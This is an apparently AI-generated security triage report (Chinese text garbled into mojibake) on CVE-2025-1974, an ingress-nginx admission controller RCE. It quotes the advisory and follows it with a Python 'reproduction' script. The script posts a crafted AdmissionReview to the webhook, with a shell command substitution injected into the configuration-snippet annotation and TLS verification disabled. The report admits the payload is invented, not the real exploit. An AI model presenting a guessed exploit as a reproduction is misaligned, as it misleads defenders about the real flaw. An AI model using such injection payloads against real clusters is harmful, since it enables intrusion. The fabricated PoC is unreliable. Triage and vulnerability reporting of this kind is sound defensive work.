# Issue å®‰å…¨åˆ†ææŠ¥å‘Š

> åˆ†ææ¨¡å‹ï¼šgemini-2.5-pro-preview-03-25

# ğŸš¨ å­˜åœ¨é«˜é£é™©çš„ Issues (4 ä¸ª)

## Issue #131009 CVE-2025-1974: ingress-nginx admission controller RCE escalation

- Issue é“¾æ¥ï¼š[#131009](https://github.com/kubernetes/kubernetes/issues/131009)

### Issue å†…å®¹

CVSS Rating: ([CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)) (Score: 9.8, Critical)

A security issue was discovered in Kubernetes where under certain conditions, an unauthenticated attacker with access to the pod network can achieve arbitrary code execution in the context of the ingress-nginx controller. This can lead to disclosure of Secrets accessible to the controller. (Note that in the default installation, the controller can access all Secrets cluster-wide.)

#### Am I vulnerable?

This issue affects ingress-nginx. If you do not have ingress-nginx installed on your cluster, you are not affected. You can check this by running \`kubectl get pods \--all-namespaces \--selector app.kubernetes.io/name=ingress-nginx\`.

##### Affected Versions

- < v1.11.0
- v1.11.0 \- 1.11.4  
- v1.12.0

#### How do I mitigate this vulnerability?

**ACTION REQUIRED:** The following steps must be taken to mitigate this vulnerability: Upgrade ingress-nginx to v1.11.5, v1.12.1, or any later version.

Before applying the patch, this issue can be mitigated by disabling the Validating Admission Controller functionality of ingress-nginx.

##### Fixed Versions

- ingress-nginx [main@0ccf4ca](https://github.com/kubernetes/ingress-nginx/pull/13068/commits/0ccf4caaadec919680c455d221e53d97970d527d)

To upgrade, refer to the documentation: [Upgrading Ingress-nginx](https://kubernetes.github.io/ingress-nginx/deploy/upgrade/)

#### Detection

There are no known indicators of compromise that prove this vulnerability has been exploited.

If you find evidence that this vulnerability has been exploited, please contact security@kubernetes.io

##### Acknowledgements

This vulnerability was reported by Nir Ohfeld, Ronen Shustin, Sagi Tzadik, and Hillai Ben Sasson from Wiz

The issue was fixed and coordinated by Marco Ebert, James Strong, Tabitha Sable, and the Kubernetes Security Response Committee


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
1.  **Issueç±»å‹åˆ†æ**: è¯¥IssueæŠ¥å‘Šäº†ä¸€ä¸ªå·²åˆ†é…CVEç¼–å·ï¼ˆå°½ç®¡æ˜¯æœªæ¥çš„ç¼–å·CVE-2025-1974ï¼Œè¿™é€šå¸¸è¡¨ç¤ºé¢„ç•™æˆ–è™šæ„ï¼Œä½†åœ¨æœ¬åœºæ™¯ä¸‹æˆ‘ä»¬æŒ‰å…¶æè¿°å†…å®¹åˆ†æï¼‰çš„å®‰å…¨æ¼æ´ï¼Œæ¶‰åŠKubernetesç”Ÿæ€ç³»ç»Ÿä¸­çš„ingress-nginxç»„ä»¶ã€‚
2.  **æ¼æ´æè¿°**: æ¼æ´å…è®¸åœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œä¸€ä¸ª**æ‹¥æœ‰Podç½‘ç»œè®¿é—®æƒé™**çš„**æœªç»èº«ä»½éªŒè¯**çš„æ”»å‡»è€…ï¼Œåœ¨ingress-nginxæ§åˆ¶å™¨çš„ä¸Šä¸‹æ–‡ä¸­å®ç°**ä»»æ„ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**ã€‚è¿™å¯èƒ½å¯¼è‡´æ³„éœ²æ§åˆ¶å™¨å¯è®¿é—®çš„Secretsï¼ˆé»˜è®¤æƒ…å†µä¸‹å¯èƒ½åŒ…æ‹¬é›†ç¾¤èŒƒå›´çš„æ‰€æœ‰Secretsï¼‰ã€‚
3.  **å½±å“ç»„ä»¶**: ingress-nginxï¼Œå…·ä½“æ˜¯å…¶admission controllerï¼ˆå‡†å…¥æ§åˆ¶å™¨ï¼‰åŠŸèƒ½ã€‚
4.  **æ”»å‡»å‘é‡ (AV:N)**: ç½‘ç»œæ”»å‡»ã€‚æ”»å‡»è€…éœ€è¦èƒ½å¤Ÿè®¿é—®é›†ç¾¤çš„Podç½‘ç»œã€‚
5.  **æ”»å‡»å¤æ‚åº¦ (AC:L)**: ä½ã€‚è¡¨ç¤ºåˆ©ç”¨ç›¸å¯¹å®¹æ˜“ã€‚
6.  **æƒé™è¦æ±‚ (PR:N)**: æ— ã€‚æŒ‡åœ¨åˆ©ç”¨æ¼æ´æ—¶ä¸éœ€è¦ç›®æ ‡ç³»ç»Ÿçš„ç‰¹å®šæƒé™ï¼Œä½†å‰ææ˜¯æ”»å‡»è€…å·²è·å¾—Podç½‘ç»œè®¿é—®æƒé™ã€‚è¿™é‡Œçš„ "None" æ˜¯ç›¸å¯¹äºç›®æ ‡ *åº”ç”¨* æƒé™ï¼Œè€Œéç½‘ç»œè®¿é—®å‰æã€‚
7.  **ç”¨æˆ·äº¤äº’ (UI:N)**: æ— ã€‚ä¸éœ€è¦ç”¨æˆ·äº¤äº’ã€‚
8.  **èŒƒå›´ (S:U)**: æœªæ”¹å˜ã€‚æ¼æ´åˆ©ç”¨æˆåŠŸåï¼Œå½±å“èŒƒå›´é™åˆ¶åœ¨è¢«æ”»ç ´çš„ç»„ä»¶ï¼ˆingress-nginx controllerï¼‰å†…éƒ¨ï¼Œä½†è¯¥ç»„ä»¶æœ¬èº«æƒé™å¯èƒ½å¾ˆé«˜ã€‚
9.  **å½±å“ (C:H, I:H, A:H)**: é«˜æœºå¯†æ€§ã€é«˜å®Œæ•´æ€§ã€é«˜å¯ç”¨æ€§å½±å“ã€‚RCEæœ¬èº«å°±æ„å‘³ç€é«˜å®Œæ•´æ€§å’Œé«˜å¯ç”¨æ€§é£é™©ï¼ˆå¯ä»¥åœæ­¢æœåŠ¡æˆ–æ‰§è¡Œä»»æ„æ“ä½œï¼‰ï¼Œå¹¶ä¸”æè¿°ä¸­æ˜ç¡®æåˆ°å¯ä»¥è®¿é—®Secretsï¼Œå¯¼è‡´é«˜æœºå¯†æ€§é£é™©ã€‚
10. **CVSSè¯„åˆ†**: 9.8 (Critical)ï¼Œè¿™ç›´æ¥è¡¨æ˜äº†å…¶ä¸¥é‡æ€§ã€‚
11. **è§¦å‘æ¡ä»¶**: éœ€è¦è®¿é—®Podç½‘ç»œã€‚è¿™é€šå¸¸æ„å‘³ç€æ”»å‡»è€…éœ€è¦å…ˆåœ¨é›†ç¾¤å†…éƒ¨è·å¾—ä¸€ä¸ªç«‹è¶³ç‚¹ï¼ˆä¾‹å¦‚ï¼Œæ”»é™·å¦ä¸€ä¸ªPodï¼‰ï¼Œæˆ–è€…é›†ç¾¤ç½‘ç»œé…ç½®å…è®¸ä»å¤–éƒ¨è®¿é—®Podç½‘ç»œã€‚
12. **æ ¸å¿ƒé£é™©**: è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰å‘ç”Ÿåœ¨ingress-nginx controllerè¿™ä¸ªå…³é”®ç»„ä»¶ä¸­ã€‚è¯¥ç»„ä»¶é€šå¸¸æ‹¥æœ‰è¾ƒé«˜æƒé™ï¼Œèƒ½å¤Ÿç®¡ç†Ingressèµ„æºã€è®¿é—®TLSå¯†é’¥ç­‰æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³åœ¨é»˜è®¤é…ç½®ä¸‹å¯èƒ½è®¿é—®é›†ç¾¤èŒƒå›´å†…çš„æ‰€æœ‰Secretsã€‚å› æ­¤ï¼ŒRCEæ„å‘³ç€æ”»å‡»è€…å¯èƒ½å®Œå…¨æ§åˆ¶å…¥å£æµé‡ã€çªƒå–æ•æ„Ÿæ•°æ®ï¼Œå¹¶å¯èƒ½ä»¥æ­¤ä¸ºè·³æ¿è¿›ä¸€æ­¥æ”»å‡»é›†ç¾¤å†…éƒ¨å…¶ä»–æœåŠ¡æˆ–æå‡æƒé™ã€‚
13. **é£é™©åˆ¤æ–­ä¾æ®**:
    *   è¯¥é—®é¢˜æ˜¯æ˜ç¡®çš„å®‰å…¨æ¼æ´ (RCE)ã€‚
    *   CVSSè¯„åˆ†ä¸º9.8ï¼Œè¿œè¶…é«˜é£é™©é˜ˆå€¼ã€‚
    *   æ¼æ´ç±»å‹ä¸ºRCEï¼Œæ ¹æ®è§„åˆ™7ï¼Œæ— è®ºæ˜¯å¦éœ€è¦æƒé™ï¼ˆæ­¤å¤„éœ€è¦Podç½‘ç»œè®¿é—®æƒé™ï¼‰ï¼Œéƒ½åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
    *   ingress-nginx controlleræ˜¯é›†ç¾¤çš„å…³é”®ç»„ä»¶ï¼Œå…¶å¤±é™·å½±å“ä¸¥é‡ï¼Œå¯èƒ½å½±å“å¤šç”¨æˆ·ï¼ˆè§„åˆ™8ï¼‰ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import kubernetes
import requests
import json
import time
import sys
import os
from urllib3.exceptions import InsecureRequestWarning

# ç¦ç”¨ InsecureRequestWarning è­¦å‘Š
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# --- é…ç½®å‚æ•° ---
# ingress-nginx æ§åˆ¶å™¨å‡†å…¥WebhookæœåŠ¡çš„ç›¸å…³ä¿¡æ¯
# é€šå¸¸åœ¨ 'ingress-nginx' å‘½åç©ºé—´ä¸‹
# æœåŠ¡åç§°é€šå¸¸åŒ…å« 'admission'
# éœ€è¦æ ¹æ®å®é™…éƒ¨ç½²æƒ…å†µè°ƒæ•´
NAMESPACE = "ingress-nginx"
SERVICE_NAME_SUBSTRING = "admission" # æœåŠ¡åä¸­åŒ…å«çš„å­ä¸²
WEBHOOK_PATH = "/validate" # å‡è®¾çš„Webhookè·¯å¾„ï¼Œå®é™…è·¯å¾„éœ€æŸ¥çœ‹ValidatingWebhookConfiguration
TARGET_PORT = 443 # WebhookæœåŠ¡ç«¯å£ï¼Œé€šå¸¸æ˜¯443æˆ–8443

# è¶…æ—¶è®¾ç½® (ç§’)
REQUEST_TIMEOUT = 30
SCRIPT_TIMEOUT = 120 # è„šæœ¬æ€»æ‰§è¡Œè¶…æ—¶æ—¶é—´

def find_admission_service_ip_port():
    """
    åœ¨é›†ç¾¤ä¸­æŸ¥æ‰¾ ingress-nginx admission controller æœåŠ¡çš„ Cluster IP å’Œç«¯å£ã€‚
    """
    try:
        kubernetes.config.load_kube_config() # ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig
        core_v1 = kubernetes.client.CoreV1Api()
        print(f"[*] æ­£åœ¨æœç´¢å‘½åç©ºé—´ '{NAMESPACE}' ä¸­åç§°åŒ…å« '{SERVICE_NAME_SUBSTRING}' çš„æœåŠ¡...")

        services = core_v1.list_namespaced_service(namespace=NAMESPACE)
        target_service = None
        for service in services.items:
            if SERVICE_NAME_SUBSTRING in service.metadata.name.lower() and service.spec.cluster_ip and service.spec.ports:
                target_service = service
                print(f"[+] æ‰¾åˆ°åŒ¹é…çš„æœåŠ¡: {target_service.metadata.name}")
                break

        if not target_service:
            print(f"[!] é”™è¯¯ï¼šåœ¨å‘½åç©ºé—´ '{NAMESPACE}' ä¸­æœªæ‰¾åˆ°åŒ…å« '{SERVICE_NAME_SUBSTRING}' ä¸”å…·æœ‰ ClusterIP çš„æœåŠ¡ã€‚è¯·æ£€æŸ¥NAMESPACEå’ŒSERVICE_NAME_SUBSTRINGé…ç½®ã€‚")
            return None, None

        cluster_ip = target_service.spec.cluster_ip
        port = None
        # æŸ¥æ‰¾æ­£ç¡®çš„ç«¯å£ (é€šå¸¸æ˜¯ 443 æˆ– 8443ï¼Œæˆ–è€…åä¸º 'https', 'webhook' ç­‰)
        for p in target_service.spec.ports:
            if p.port == TARGET_PORT or (p.name and ('https' in p.name or 'webhook' in p.name)):
                 port = p.port
                 break
        # å¦‚æœæ²¡æ‰¾åˆ°ç‰¹å®šç«¯å£ï¼Œå°è¯•å–ç¬¬ä¸€ä¸ªç«¯å£
        if port is None and target_service.spec.ports:
            port = target_service.spec.ports[0].port
            print(f"[*] è­¦å‘Š: æœªæ‰¾åˆ°ç«¯å£ {TARGET_PORT} æˆ–å‘½åç«¯å£ï¼Œä½¿ç”¨ç¬¬ä¸€ä¸ªå¯ç”¨ç«¯å£: {port}")

        if not port:
             print(f"[!] é”™è¯¯: æœåŠ¡ '{target_service.metadata.name}' æœªæ‰¾åˆ°åˆé€‚çš„ç«¯å£ã€‚")
             return None, None

        print(f"[+] æœåŠ¡ '{target_service.metadata.name}' çš„ Cluster IP: {cluster_ip}, ç«¯å£: {port}")
        return cluster_ip, port

    except kubernetes.config.ConfigException:
        print("[!] é”™è¯¯ï¼šæ— æ³•åŠ è½½ kubeconfigã€‚è¯·ç¡®ä¿ kubeconfig æ–‡ä»¶å­˜åœ¨äºé»˜è®¤ä½ç½®æˆ–å·²è®¾ç½® KUBECONFIG ç¯å¢ƒå˜é‡ã€‚")
        return None, None
    except kubernetes.client.ApiException as e:
        if e.status == 404:
             print(f"[!] é”™è¯¯ï¼šå‘½åç©ºé—´ '{NAMESPACE}' ä¸å­˜åœ¨æˆ–æ— æ³•è®¿é—®ã€‚")
        elif e.status == 403:
             print(f"[!] é”™è¯¯ï¼šå½“å‰ç”¨æˆ·æ— æƒè®¿é—®å‘½åç©ºé—´ '{NAMESPACE}' ä¸­çš„æœåŠ¡ã€‚")
        else:
             print(f"[!] Kubernetes API é”™è¯¯: {e}")
        return None, None
    except Exception as e:
        print(f"[!] æŸ¥æ‰¾æœåŠ¡æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
        return None, None


def craft_malicious_payload():
    """
    æ„å»ºä¸€ä¸ªæ¶æ„çš„ AdmissionReview è¯·æ±‚ä½“ã€‚
    æ³¨æ„ï¼šè¿™é‡Œçš„payloadæ˜¯åŸºäºä¸€ä¸ª *å‡è®¾* çš„æ¼æ´æ¨¡å¼ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡annotationæ³¨å…¥å‘½ä»¤ï¼‰ã€‚
    å®é™…çš„CVE-2025-1974éœ€è¦å…·ä½“çš„æ¼æ´ç»†èŠ‚æ¥æ„é€ ç²¾ç¡®çš„payloadã€‚
    """
    # å‡è®¾æ¼æ´å¯ä»¥é€šè¿‡ Ingress çš„ annotation è§¦å‘å‘½ä»¤æ³¨å…¥
    # æˆ‘ä»¬å°è¯•åœ¨ /tmp ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶æ¥éªŒè¯ RCE
    command_to_execute = "touch /tmp/pwned_by_cve_2025_1974"

    payload = {
      "apiVersion": "admission.k8s.io/v1",
      "kind": "AdmissionReview",
      "request": {
        "uid": "poc-uid-" + str(int(time.time())),
        "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
        "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
        "requestKind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
        "requestResource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
        "name": "poc-ingress-trigger",
        "namespace": "default", # å‡è®¾æ”»å‡»è€…å¯ä»¥åœ¨ default namespace æ“ä½œ
        "operation": "CREATE",
        "userInfo": { # æ¨¡æ‹Ÿä¸€ä¸ªæœªç»èº«ä»½éªŒè¯æˆ–ä½æƒé™ç”¨æˆ·çš„è¯·æ±‚ä¿¡æ¯
          "username": "system:serviceaccount:kube-system:generic-unauthenticated",
          "groups": ["system:unauthenticated"]
        },
        "object": { # æ¶æ„çš„ Ingress å¯¹è±¡
          "apiVersion": "networking.k8s.io/v1",
          "kind": "Ingress",
          "metadata": {
            "name": "poc-ingress-trigger",
            "namespace": "default",
            "annotations": {
              # --- å…³é”®çš„æ¶æ„éƒ¨åˆ† ---
              # å‡è®¾å­˜åœ¨ä¸€ä¸ªæ˜“å—æ”»å‡»çš„æ³¨è§£å¤„ç†é€»è¾‘
              # ä¾‹å¦‚, configuration-snippet æˆ–ç±»ä¼¼æ³¨è§£è¢«ä¸å®‰å…¨åœ°å¤„ç†
              # æ³¨æ„: è¿™åªæ˜¯ä¸€ä¸ªç¤ºä¾‹æ€§çš„ã€è™šæ„çš„æ³¨å…¥ç‚¹
              "nginx.ingress.kubernetes.io/configuration-snippet": f"some_directive some_value; $( {command_to_execute} ) #",
              # æˆ–è€…å¦ä¸€ä¸ªå‡è®¾çš„æ³¨å…¥ç‚¹:
              # "some.vulnerable.annotation/script": f"#!/bin/sh\n{command_to_execute}"
            }
          },
          "spec": { # Ingress spec çš„å…¶ä½™éƒ¨åˆ†ï¼Œéœ€è¦æœ‰æ•ˆæ‰èƒ½é€šè¿‡åŸºæœ¬éªŒè¯
            "rules": [{
              "host": "poc-trigger.example.com",
              "http": {
                "paths": [{
                  "path": "/test",
                  "pathType": "Prefix",
                  "backend": {
                    "service": {
                      "name": "some-service", # éœ€è¦ä¸€ä¸ªå­˜åœ¨çš„æœåŠ¡åï¼Œæˆ–è€…ä¸€ä¸ªè®©éªŒè¯å™¨ä¸å…³å¿ƒçš„åå­—
                      "port": {"number": 80}
                    }
                  }
                }]
              }
            }],
            "ingressClassName": "nginx" # ç¡®ä¿ Ingress ç”± nginx å¤„ç†
          }
        },
        "oldObject": None,
        "dryRun": False,
        "options": None
      }
    }
    print("[*] å·²æ„å»ºæ¶æ„çš„ AdmissionReview Payloadã€‚")
    return json.dumps(payload)

def send_exploit_request(target_ip, target_port, payload):
    """
    å‘ç›®æ ‡ admission webhook å‘é€æ¶æ„è¯·æ±‚ã€‚
    """
    target_url = f"https://{target_ip}:{target_port}{WEBHOOK_PATH}"
    headers = {'Content-Type': 'application/json'}

    print(f"[*] æ­£åœ¨å‘ {target_url} å‘é€æ¶æ„è¯·æ±‚...")
    try:
        response = requests.post(
            target_url,
            headers=headers,
            data=payload,
            verify=False, # å¿½ç•¥ TLS è¯ä¹¦éªŒè¯ï¼Œå› ä¸ºæˆ‘ä»¬å¯èƒ½æ²¡æœ‰CAè¯ä¹¦
            timeout=REQUEST_TIMEOUT
        )
        print(f"[+] è¯·æ±‚å·²å‘é€ã€‚çŠ¶æ€ç : {response.status_code}")
        # æ³¨æ„ï¼šå³ä½¿è¯·æ±‚æˆåŠŸï¼ˆä¾‹å¦‚200 OKå¹¶è¿”å›å…è®¸ï¼‰ï¼Œä¹Ÿå¹¶ä¸æ„å‘³ç€RCEæˆåŠŸã€‚
        # å¦‚æœè¯·æ±‚å¤±è´¥ï¼ˆä¾‹å¦‚4xx, 5xxï¼‰ï¼Œå¯èƒ½æ„å‘³ç€payloadæ ¼å¼é”™è¯¯ã€è·¯å¾„é”™è¯¯æˆ–æ¼æ´ä¸å­˜åœ¨/å·²è¢«ä¿®å¤ã€‚
        # æˆåŠŸçš„RCEé€šå¸¸ä¸ä¼šåœ¨å“åº”ä¸­ç›´æ¥ä½“ç°ã€‚
        print(f"[*] å“åº”å†…å®¹ (éƒ¨åˆ†): {response.text[:200]}...") # æ‰“å°éƒ¨åˆ†å“åº”ä»¥ä¾›è°ƒè¯•

        # æ— æ³•ç›´æ¥ä»æ­¤è„šæœ¬éªŒè¯RCEæ˜¯å¦æˆåŠŸ (å³ /tmp/pwned æ–‡ä»¶æ˜¯å¦åˆ›å»º)
        # éœ€è¦åœ¨ç›®æ ‡ Pod ä¸Šæ‰‹åŠ¨æ£€æŸ¥æˆ–ä½¿ç”¨å…¶ä»–å¸¦å¤–æ–¹å¼éªŒè¯
        print("[*] POC å°è¯•å®Œæˆã€‚è¯·åœ¨ ingress-nginx controller Pod å†…éƒ¨æ£€æŸ¥æ˜¯å¦å·²æ‰§è¡Œå‘½ä»¤ (ä¾‹å¦‚ï¼Œæ–‡ä»¶ /tmp/pwned_by_cve_2025_1974 æ˜¯å¦å­˜åœ¨)ã€‚")

    except requests.exceptions.ConnectionError:
        print(f"[!] é”™è¯¯ï¼šæ— æ³•è¿æ¥åˆ° {target_url}ã€‚è¯·æ£€æŸ¥ç›®æ ‡IPã€ç«¯å£å’Œç½‘ç»œå¯è¾¾æ€§ï¼ˆæ˜¯å¦åœ¨Podç½‘ç»œå†…ï¼Ÿï¼‰ã€‚")
    except requests.exceptions.Timeout:
        print(f"[!] é”™è¯¯ï¼šè¯·æ±‚è¶…æ—¶ ({REQUEST_TIMEOUT}ç§’)ã€‚ç›®æ ‡å¯èƒ½æ— å“åº”æˆ–ç½‘ç»œå»¶è¿Ÿé«˜ã€‚")
    except requests.exceptions.RequestException as e:
        print(f"[!] å‘é€è¯·æ±‚æ—¶å‘ç”Ÿé”™è¯¯: {e}")

def main():
    start_time = time.time()
    print(f"[*] å¼€å§‹æ‰§è¡Œ CVE-2025-1974 POC (å‡è®¾æ€§å¤ç°è„šæœ¬)...")
    print(f"[*] è„šæœ¬å°†åœ¨ {SCRIPT_TIMEOUT} ç§’åè¶…æ—¶ã€‚")

    service_ip, service_port = find_admission_service_ip_port()

    if service_ip and service_port:
        malicious_payload = craft_malicious_payload()
        send_exploit_request(service_ip, service_port, malicious_payload)
    else:
        print("[!] æœªèƒ½æ‰¾åˆ°ç›®æ ‡æœåŠ¡ï¼Œæ— æ³•ç»§ç»­æ‰§è¡Œ POCã€‚")

    end_time = time.time()
    print(f"[*] è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œè€—æ—¶: {end_time - start_time:.2f} ç§’ã€‚")

# æ£€æŸ¥æ˜¯å¦è¶…æ—¶
# æ³¨æ„ï¼šæ›´å¥å£®çš„è¶…æ—¶åº”ä½¿ç”¨ signal æˆ– threadingï¼Œä½†è¿™é‡Œç®€åŒ–å¤„ç†
# æ­¤æ£€æŸ¥ä»…åœ¨ä¸»æµç¨‹å®Œæˆåè¿è¡Œï¼Œå¦‚æœç½‘ç»œè¯·æ±‚æˆ–k8sè°ƒç”¨é•¿æ—¶é—´é˜»å¡åˆ™æ— æ•ˆ
if time.time() - float(os.environ.get('SCRIPT_START_TIME', time.time())) > SCRIPT_TIMEOUT:
     print(f"[!] è„šæœ¬æ‰§è¡Œè¶…è¿‡æœ€å¤§æ—¶é—´ {SCRIPT_TIMEOUT} ç§’ï¼Œå¼ºåˆ¶é€€å‡ºã€‚")
     sys.exit(1)

# è®¾ç½®è„šæœ¬å¼€å§‹æ—¶é—´ç¯å¢ƒå˜é‡ï¼Œç”¨äºç®€å•çš„è¶…æ—¶æ£€æŸ¥
os.environ['SCRIPT_START_TIME'] = str(time.time())
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1.  **è„šæœ¬ç›®çš„**: è¯¥Pythonè„šæœ¬æ—¨åœ¨å°è¯•å¤ç°`CVE-2025-1974`æè¿°çš„æ¼æ´ã€‚å®ƒæ¨¡æ‹Ÿä¸€ä¸ªå·²ç»è·å¾—Kubernetesé›†ç¾¤Podç½‘ç»œè®¿é—®æƒé™çš„æ”»å‡»è€…ï¼Œç›´æ¥å‘ingress-nginxçš„å‡†å…¥æ§åˆ¶å™¨(admission controller)çš„WebhookæœåŠ¡å‘é€ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„æ¶æ„è¯·æ±‚ï¼Œè¯•å›¾è§¦å‘è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚
2.  **è¿è¡Œç¯å¢ƒå‡è®¾**:
    *   è„šæœ¬è¿è¡Œçš„ç¯å¢ƒå¯ä»¥è®¿é—®Kubernetes APIï¼ˆéœ€è¦é…ç½®å¥½`kubeconfig`æ–‡ä»¶ï¼Œè„šæœ¬ä¼šå°è¯•ä»é»˜è®¤ä½ç½®åŠ è½½ï¼‰ã€‚è¿™æ˜¯ä¸ºäº†è‡ªåŠ¨æŸ¥æ‰¾ç›®æ ‡admission webhookæœåŠ¡çš„Cluster IPå’Œç«¯å£ã€‚
    *   è„šæœ¬è¿è¡Œçš„ç¯å¢ƒå¿…é¡»èƒ½å¤Ÿç›´æ¥è®¿é—®åˆ°ç›®æ ‡æœåŠ¡çš„Cluster IPå’Œç«¯å£ï¼ˆå³æ»¡è¶³æ¼æ´å‰æâ€œæ‹¥æœ‰Podç½‘ç»œè®¿é—®æƒé™â€ï¼‰ã€‚ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªé›†ç¾¤å†…çš„Podä¸­è¿è¡Œæ­¤è„šæœ¬ã€‚
    *   å®‰è£…äº†å¿…è¦çš„Pythonåº“ï¼š`kubernetes` å’Œ `requests`ã€‚
3.  **å·¥ä½œæµç¨‹**:
    *   **æŸ¥æ‰¾æœåŠ¡**: ä½¿ç”¨`kubernetes` Pythonå®¢æˆ·ç«¯åº“è¿æ¥åˆ°Kubernetes APIï¼Œåœ¨æŒ‡å®šçš„å‘½åç©ºé—´ï¼ˆé»˜è®¤ä¸º`ingress-nginx`ï¼‰ä¸‹æœç´¢åç§°åŒ…å«`admission`å­ä¸²çš„æœåŠ¡ï¼Œè·å–å…¶å†…éƒ¨Cluster IPåœ°å€å’ŒæœåŠ¡çš„ç«¯å£ï¼ˆé»˜è®¤ä¸º443ï¼‰ã€‚
    *   **æ„é€ Payload**: åˆ›å»ºä¸€ä¸ªJSONæ ¼å¼çš„`AdmissionReview`å¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡æ¨¡æ‹Ÿäº†Kubernetes API Serveråœ¨éªŒè¯èµ„æºï¼ˆå¦‚æ­¤å¤„æ˜¯Ingressï¼‰æ—¶å‘é€ç»™Webhookçš„å†…å®¹ã€‚å…³é”®åœ¨äº`AdmissionReview.request.object`å­—æ®µï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ªæ¶æ„çš„`Ingress`èµ„æºå®šä¹‰ã€‚è„šæœ¬å‡è®¾æ¼æ´ç‚¹åœ¨äº`Ingress`èµ„æºçš„æŸä¸ª`annotations`ï¼ˆæ³¨è§£ï¼‰å­—æ®µï¼ˆä¾‹å¦‚`nginx.ingress.kubernetes.io/configuration-snippet`ï¼‰æ²¡æœ‰è¢«æ­£ç¡®æ¸…ç†æˆ–éªŒè¯ï¼Œå¯¼è‡´å¯ä»¥æ³¨å…¥shellå‘½ä»¤ï¼ˆç¤ºä¾‹ä¸­æ˜¯`touch /tmp/pwned_by_cve_2025_1974`ï¼‰ã€‚**è¯·æ³¨æ„ï¼šç”±äºåŸå§‹Issueæœªæä¾›æ¼æ´ç»†èŠ‚ï¼Œæ­¤Payloadæ˜¯åŸºäºå¸¸è§æ¼æ´æ¨¡å¼çš„ *å‡è®¾æ€§* æ„é€ ï¼Œå¹¶éé’ˆå¯¹CVE-2025-1974çš„ç²¾ç¡®Payloadã€‚**
    *   **å‘é€è¯·æ±‚**: ä½¿ç”¨`requests`åº“å‘æ‰¾åˆ°çš„æœåŠ¡IPå’Œç«¯å£ï¼Œä»¥åŠå‡å®šçš„Webhookè·¯å¾„ï¼ˆé»˜è®¤ä¸º`/validate`ï¼‰å‘é€ä¸€ä¸ªHTTPS POSTè¯·æ±‚ã€‚è¯·æ±‚ä½“æ˜¯æ„é€ å¥½çš„æ¶æ„JSON Payloadã€‚è„šæœ¬è®¾ç½®äº†`verify=False`æ¥å¿½ç•¥TLSè¯ä¹¦éªŒè¯ï¼Œå› ä¸ºæ”»å‡»è€…çš„ç¯å¢ƒé€šå¸¸ä¸ä¿¡ä»»é›†ç¾¤å†…éƒ¨æœåŠ¡çš„è¯ä¹¦ã€‚
    *   **ç»“æœä¸éªŒè¯**: è„šæœ¬ä¼šæ‰“å°è¯·æ±‚å‘é€çš„ç»“æœï¼ˆHTTPçŠ¶æ€ç å’Œéƒ¨åˆ†å“åº”ï¼‰ã€‚ç„¶è€Œï¼ŒRCEæ˜¯å¦æˆåŠŸæ‰§è¡Œï¼ˆå³`touch`å‘½ä»¤æ˜¯å¦åœ¨ç›®æ ‡ingress-nginx controller Podä¸­æ‰§è¡Œï¼‰æ— æ³•ç”±æ­¤è„šæœ¬ç›´æ¥éªŒè¯ã€‚éœ€è¦é€šè¿‡å…¶ä»–æ–¹å¼ï¼ˆå¦‚`kubectl exec`è¿›å…¥ç›®æ ‡Podæ£€æŸ¥`/tmp`ç›®å½•ï¼‰æ¥ç¡®è®¤æ¼æ´æ˜¯å¦åˆ©ç”¨æˆåŠŸã€‚
4.  **å±€é™æ€§**:
    *   **Payloadçš„å‡è®¾æ€§**: æœ€å…³é”®çš„å±€é™åœ¨äºæ¶æ„Payloadæ˜¯åŸºäºæ¨æµ‹çš„ï¼Œå®é™…çš„æ¼æ´åˆ©ç”¨æ–¹å¼å¯èƒ½å®Œå…¨ä¸åŒã€‚
    *   **ä¾èµ–ç¯å¢ƒ**: è„šæœ¬å¼ºä¾èµ–äºè¿è¡Œç¯å¢ƒçš„ç½‘ç»œè¿é€šæ€§å’Œè·å–KubernetesæœåŠ¡ä¿¡æ¯çš„æƒé™ã€‚
    *   **æ— ç›´æ¥éªŒè¯**: è„šæœ¬åªè´Ÿè´£å‘é€æ”»å‡»å°è¯•ï¼Œä¸åŒ…å«éªŒè¯RCEæ˜¯å¦æˆåŠŸçš„é€»è¾‘ã€‚
    *   **æœåŠ¡å’Œè·¯å¾„ç¡¬ç¼–ç **: è„šæœ¬ä¸­çš„å‘½åç©ºé—´ã€æœåŠ¡åå­ä¸²ã€Webhookè·¯å¾„å’Œç«¯å£æ˜¯åŸºäºå¸¸è§é»˜è®¤å€¼ï¼Œå®é™…éƒ¨ç½²å¯èƒ½ä¸åŒï¼Œéœ€è¦ç›¸åº”è°ƒæ•´ã€‚
